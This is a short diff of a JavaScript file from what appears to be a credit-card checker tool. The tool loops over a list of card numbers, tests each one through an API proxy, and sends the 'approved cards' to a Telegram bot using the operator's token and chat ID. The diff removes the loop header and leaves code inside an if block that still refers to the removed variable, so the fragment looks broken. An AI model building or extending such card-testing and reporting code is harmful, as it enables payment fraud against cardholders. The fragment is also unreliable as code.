@@ -214,13 +214,6 @@ function processApiResponse(cc, result) {
     
     // Send Telegram notification for approved cards
     if (isSuccess && botToken && chatId) {
-    for (let i = 0; i < ccList.length && isProcessing; i++) {
-        const cc = ccList[i].trim();
-        if (!cc) continue;
-        
-        updateProgress(i + 1, ccList.length);
-        addTerminalMessage(`🔄 Processing: ${cc}`, 'processing');
-        
         try {
             // Call Vercel API proxy with user's Telegram credentials
             const response = fetch('/api/proxy', {
